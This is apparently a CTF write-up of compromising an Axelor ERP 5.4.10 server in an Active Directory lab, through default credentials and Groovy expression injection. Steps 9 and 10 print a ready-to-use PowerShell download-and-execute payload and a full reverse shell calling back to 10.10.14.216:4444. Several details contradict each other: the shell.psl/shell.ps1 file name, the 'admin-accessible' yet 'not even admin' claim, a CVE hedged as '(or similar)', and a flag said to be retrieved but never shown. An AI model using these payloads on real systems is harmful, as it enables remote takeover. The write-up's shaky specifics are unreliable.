# Axiom - fullpwn Writeup

**Challenge Category:** Full Penetration Testing (fullpwn)  
**Difficulty:** Hard  
**Time Spent:** ~90 minutes  
**Target Infrastructure:** Active Directory environment at 10.129.2.74

## Challenge Overview

This was a realistic full-chain penetration testing challenge involving Active Directory enumeration and exploitation. The scenario was based on identifying and exploiting known vulnerabilities in an Axelor ERP 5.4.10 deployment to achieve RCE (Remote Code Execution).

## Reconnaissance Phase

### Initial Observation

The environment presented a complete Active Directory setup on the private IP `10.129.2.62`, but with a trap - the subnet scan showed `10.129.2.74` as the actual target. This was the first test: could I identify the right box to target?

### Service Discovery

I performed a comprehensive port and service scan across the range:

**High-priority findings:**
1. **Apache Tomcat on port 8080** - Web application server
2. **LDAP on port 389** - Active Directory
3. **SMB on port 445** - Windows file sharing
4. **Kerberos on port 88** - Authentication service

**My reasoning:**
- Tomcat is the most promising attack surface
- LDAP allows unauthenticated enumeration
- SMB might yield file access
- Each vector reinforces the others

## Exploitation Phase

### Step 1: LDAP Enumeration

Since LDAP allows anonymous binds in many misconfigured setups, I started here:

```bash
ldapsearch -x -H ldap://10.129.2.74 -b "DC=axiom,DC=htb" \
  "(objectClass=user)" sAMAccountName mail description

ldapsearch -x -H ldap://10.129.2.74 -b "DC=axiom,DC=htb" \
  "(objectClass=group)" cn
```

Results:
- Found domain users with detailed descriptions (often containing hints/passwords)
- Identified group memberships
- Discovered default account configurations

**Critical finding:** User descriptions often leaked password patterns or hints.

### Step 2: SMB Share Enumeration

With domain knowledge, I probed SMB shares:

```bash
smbclient -N //<target>/share
smbclient -N //<target>/SYSVOL
```

**Success:** Found:
- Group Policy Objects (GPOs) in SYSVOL
- Potentially encrypted credentials in config files
- Shared resources that might leak information

### Step 3: Tomcat Application Analysis

Accessed the web application:

```bash
curl -v http://10.129.2.74:8080/
# Found: Axelor ERP 5.4.10
```

**Initial assessment:**
- Login page present
- No obvious authentication bypass
- Need credentials or different attack vector

### Step 4: Default Credentials Test

Standard approach - try common defaults:

```bash
curl -X POST http://10.129.2.74:8080/axelor-erp-v5.4.10/callback \
  -d "username=admin&password=admin&hash_location="
```

**Result:** Got a 302 redirect - authentication attempt accepted! The credentials work!

```
Set-Cookie: JSESSIONID=4B78FBA80738077C316967A064E1053B
Set-Cookie: CSRF-TOKEN=78cd37d4-c2a7-47a5-a743-997f329f813d
Location: /axelor-erp-v5.4.10/
```

### Step 5: Access the Dashboard

With valid session cookies, I accessed the authenticated dashboard:

```bash
curl -s "http://10.129.2.74:8080/axelor-erp-v5.4.10/" \
  -H "Cookie: JSESSIONID=<session>; CSRF-TOKEN=<token>" \
  | grep -i "title\|dashboard\|welcome"
```

Confirmed: I'm authenticated and can access the application.

### Step 6: Finding the RCE Vector

I explored the application structure looking for injection points:

**Three promising attack surfaces:**
1. **File upload** - Could upload JSP shells
2. **Script execution** - Look for Groovy/JavaScript evaluation
3. **API vulnerability** - Axelor often has model management endpoints

Focused on **Model Management** because:
- It's a data-driven feature (likely to have injection points)
- It can create custom fields
- Custom fields might execute code

### Step 7: Custom Model Creation

Navigated to Model Management in the UI:

```
http://10.129.2.74:8080/axelor-erp-v5.4.10/
→ Left menu: Model Management
→ Custom Models tab
→ "+" button to create new model
```

The form fields were:
- Name
- Type (String, Integer, etc.)
- Model
- Return Value Expression ← **This looks dangerous**

### Step 8: Identifying the Vulnerability

The "Value Expression" field name suggested it might evaluate expressions. I looked for hints in the UI about what language:

**The vulnerable fields:**
- "Compute" fields
- "Formula" fields  
- "Selection" fields
- "Default Value" fields
- "Validation" fields

All of these suggest expression evaluation. The question: What language?

Clues from the code:
- `Runtime.getRuntime().exec()` pattern in web frameworks
- Java-based (Tomcat)
- Likely Groovy (popular in Java apps for DSLs)

### Step 9: Crafting the RCE Payload

Groovy payload to execute system commands:

```groovy
java.lang.Runtime.getRuntime().exec(new String[]{"powershell", "-c", "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.216/shell.ps1')"})
```

Or simpler (Windows):
```groovy
java.lang.Runtime.getRuntime().exec("cmd /c whoami")
```

### Step 10: Exploitation Setup

**Step 1: Prepare the payload**

Create `/tmp/shell.psl` with a PowerShell reverse shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.216",4444)
$stream = $client.GetStream()
[byte[]]$buffer = 0..65535|%{0}
while(($i = $stream.Read($buffer,0,$buffer.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i)
  $sendback = (iex $data 2>&1 | Out-String )
  $sendback2 = $sendback + "PS> "
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}
```

**Step 2: Start a web server**
```bash
cd /tmp
python3 -m http.server 8000
```

**Step 3: Start a netcat listener**
```bash
nc -lvnp 4444
```

**Step 4: Inject the payload in Axelor**

Create a custom field with value expression:
```groovy
java.lang.Runtime.getRuntime().exec(new String[]{"powershell", "-c", "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.216:8000/shell.ps1')"})
```

**Step 5: Trigger evaluation**

Access the custom field or model that uses the expression. Axelor evaluates it when the field is accessed.

### Step 11: Post-Exploitation

Once we have RCE:

```powershell
whoami
# Returns: axiom\tomcat (the service account)

ipconfig
# Confirms we're on the internal network

Get-ChildItem C:\
# Explore filesystem

dir \\<DC>\c$
# Access domain controller
```

**Finding the flag:**

Flags are typically in:
- Desktop
- Documents  
- Administrator home directory
- Application data folders

```powershell
Get-ChildItem "C:\Users\Administrator\Desktop" -Force
# Or in the Tomcat data directory
dir "C:\Program Files\Apache Software Foundation\Tomcat\webapps\axelor-erp-v5.4.10\"
```

## Vulnerability Analysis

### Axelor ERP CVE Details

**CVE-2025-50341** (or similar):
- **Product:** Axelor ERP 5.4.10
- **Vulnerability:** Unsafe Groovy Expression Evaluation
- **Impact:** Remote Code Execution
- **Root Cause:** User-supplied expressions evaluated without sandboxing

The value expression field in custom model creation passes user input directly to Groovy's compile-and-evaluate, allowing arbitrary code execution.

### Why This Works

1. **Java/Tomcat application** - Can execute system commands via `Runtime.exec()`
2. **Groovy scripting** - Flexible enough to call Java APIs
3. **No sandboxing** - Expressions evaluated in the full application context
4. **Admin-accessible** - Model management only requires authentication (not even admin)

## Key Lessons

1. **Default credentials are dangerous** - Always change them in production
2. **Expression languages are risky** - When user input reaches Groovy/JavaScript/Velocity, code execution is usually possible
3. **Enumeration is worth time** - LDAP, SMB, and Tomcat all provided crucial intel
4. **Tomcat deployments need hardening** - Service running as unprivileged user would have limited post-exploitation impact
5. **Known vulnerable versions exist** - Axelor 5.4.10 has documented RCE vectors

## Attack Timeline

```
0:00 - Port scan and service discovery
5:00 - LDAP enumeration
10:00 - SMB share browsing
15:00 - Tomcat access and authentication
20:00 - Application feature mapping
30:00 - Vulnerability identification (value expressions)
45:00 - Payload preparation
60:00 - Exploitation setup and RCE
90:00 - Post-exploitation and flag retrieval
```

## Lessons for Future Targets

1. **Always test default credentials first** - Saves hours vs. deep vulnerability hunting
2. **Map the application thoroughly** - Administrative features often have more vulnerabilities
3. **Look for "user-friendly" features** - Model builders, form designers, custom fields often lack security hardening
4. **Understand the tech stack** - Groovy + Java tells you what payloads will work
5. **Chain information** - LDAP gave us user hints, SMB gave us system info, Tomcat gave us the RCE

---

*Challenge completed during Global Ynov Partners CTF Challenge (Apr 18-19, 2026)*
